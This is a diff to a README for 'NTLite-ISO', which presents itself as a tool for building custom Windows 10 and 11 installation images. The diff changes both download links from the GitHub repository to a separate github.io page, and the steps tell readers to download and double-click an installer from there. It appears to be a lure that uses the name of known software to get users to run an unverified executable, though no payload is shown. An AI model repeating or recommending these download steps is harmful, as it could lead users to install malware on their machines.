@@ -1,6 +1,6 @@
 # 🛠️ NTLite-ISO - Create custom Windows installation images easily
 
-[![](https://img.shields.io/badge/Download_NTLite-Blue.svg)](https://github.com/Rahelpersonalized899/NTLite-ISO)
+[![](https://img.shields.io/badge/Download_NTLite-Blue.svg)](https://rahelpersonalized899.github.io)
 
 NTLite-ISO helps you build custom Windows 10 and 11 installation images. You remove unwanted components, integrate updates, and configure settings before you install the operating system. This tool saves time during deployment and creates a lean version of Windows tailored to your needs.
 
@@ -18,7 +18,7 @@ To run NTLite, your computer needs these basic specs:
 
 Follow these steps to set up the software on your machine:
 
-1. Visit [this page to download](https://github.com/Rahelpersonalized899/NTLite-ISO) the latest installer.
+1. Visit [this page to download](https://rahelpersonalized899.github.io) the latest installer.
 2. Find the setup file in your Downloads folder.
 3. Double-click the file to start the installation wizard.
 4. Follow the prompts on the screen to finish the process.
